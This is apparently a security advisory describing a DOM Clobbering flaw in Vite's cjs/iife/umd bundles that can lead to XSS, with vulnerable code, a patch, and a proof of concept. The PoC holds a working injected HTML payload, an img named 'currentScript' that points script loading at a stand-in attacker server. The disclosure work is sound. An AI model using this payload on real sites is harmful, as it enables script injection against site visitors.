summary: "Vite DOM Clobbering gadget found in vite bundled scripts that leads to XSS\n### Summary\n\
  \nWe discovered a DOM Clobbering vulnerability in Vite when building scripts to `cjs`/`iife`/`umd`\
  \ output format. The DOM Clobbering gadget in the module can lead to cross-site scripting\
  \ (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag\
  \ with an unsanitized name attribute) are present.\n\nNote that, we have identified similar\
  \ security issues in Webpack: https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986\n\
  \n### Details\n\n**Backgrounds**\n\nDOM Clobbering is a type of code-reuse attack where the\
  \ attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage\
  \ (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in\
  \ the existing javascript code to transform it into executable code. More for information\
  \ about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n\
  [2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n**Gadgets found in\
  \ Vite**\n\nWe have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly\
  \ when the scripts dynamically import other scripts from the assets folder and the developer\
  \ sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative\
  \ paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`.\n\
  \nHowever, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript`\
  \ lookup can be shadowed by an attacker via the browser's named DOM tree element access mechanism.\
  \ This manipulation allows an attacker to replace the intended script element with a malicious\
  \ HTML element. When this happens, the src attribute of the attacker-controlled element is\
  \ used as the URL for importing scripts, potentially leading to the dynamic loading of scripts\
  \ from an attacker-controlled server.\n\n```\nconst relativeUrlMechanisms = {\n  amd: (relativePath)\
  \ => {\n    if (relativePath[0] !== \".\") relativePath = \"./\" + relativePath;\n    return\
  \ getResolveUrl(\n      `require.toUrl('${escapeId(relativePath)}'), document.baseURI`\n \
  \   );\n  },\n  cjs: (relativePath) => `(typeof document === 'undefined' ? ${getFileUrlFromRelativePath(\n\
  \    relativePath\n  )} : ${getRelativeUrlFromDocument(relativePath)})`,\n  es: (relativePath)\
  \ => getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}', import.meta.url`\n\
  \  ),\n  iife: (relativePath) => getRelativeUrlFromDocument(relativePath),\n  // NOTE: make\
  \ sure rollup generate `module` params\n  system: (relativePath) => getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}',\
  \ module.meta.url`\n  ),\n  umd: (relativePath) => `(typeof document === 'undefined' && typeof\
  \ location === 'undefined' ? ${getFileUrlFromRelativePath(\n    relativePath\n  )} : ${getRelativeUrlFromDocument(relativePath,\
  \ true)})`\n};\n```\n\n### PoC\n\nConsidering a website that contains the following `main.js`\
  \ script, the devloper decides to use the Vite to bundle up the program with the following\
  \ configuration. \n\n```\n// main.js\nimport extraURL from './extra.js?url'\nvar s = document.createElement('script')\n\
  s.src = extraURL\ndocument.head.append(s)\n```\n\n```\n// extra.js\nexport default \"https://myserver/justAnOther.js\"\
  \n```\n\n```\n// vite.config.js\nimport { defineConfig } from 'vite'\n\nexport default defineConfig({\n\
  \  build: {\n    assetsInlineLimit: 0, // To avoid inline assets for PoC\n    rollupOptions:\
  \ {\n      output: {\n        format: \"cjs\"\n      },\n    },\n  },\n  base: \"./\",\n});\n\
  ```\n\nAfter running the build command, the developer will get following bundle as the output.\n\
  \n```\n// dist/index-DDmIg9VD.js\n\"use strict\";const t=\"\"+(typeof document>\"u\"?require(\"\
  url\").pathToFileURL(__dirname+\"/extra-BLVEx9Lb.js\").href:new URL(\"extra-BLVEx9Lb.js\"\
  ,document.currentScript&&document.currentScript.src||document.baseURI).href);var e=document.createElement(\"\
  script\");e.src=t;document.head.append(e);\n```\n\nAdding the Vite bundled script, `dist/index-DDmIg9VD.js`,\
  \ as part of the web page source code, the page could load the `extra.js` file from the attacker's\
  \ domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with\
  \ the `name` attribute set to `currentScript`. This can be done through a website's feature\
  \ that allows users to embed certain script-less HTML (e.g., markdown renderers, web email\
  \ clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded\
  \ on the page.\n\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Vite Example</title>\n\
  \  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\"\
  \ src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less\
  \ HTML Element ends--!>\n</head>\n<script type=\"module\" crossorigin src=\"/assets/index-DDmIg9VD.js\"\
  ></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can result in\
  \ cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured\
  \ with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless\
  \ HTML tags without properly sanitizing the name or id attributes.\n\n### Patch\n\n```\n//\
  \ https://github.com/vitejs/vite/blob/main/packages/vite/src/node/build.ts#L1296\nconst getRelativeUrlFromDocument\
  \ = (relativePath: string, umd = false) =>\n  getResolveUrl(\n    `'${escapeId(partialEncodeURIPath(relativePath))}',\
  \ ${\n      umd ? `typeof document === 'undefined' ? location.href : ` : ''\n    }document.currentScript\
  \ && document.currentScript.tagName.toUpperCase() === 'SCRIPT' && document.currentScript.src\
  \ || document.baseURI`,\n  )\n```"
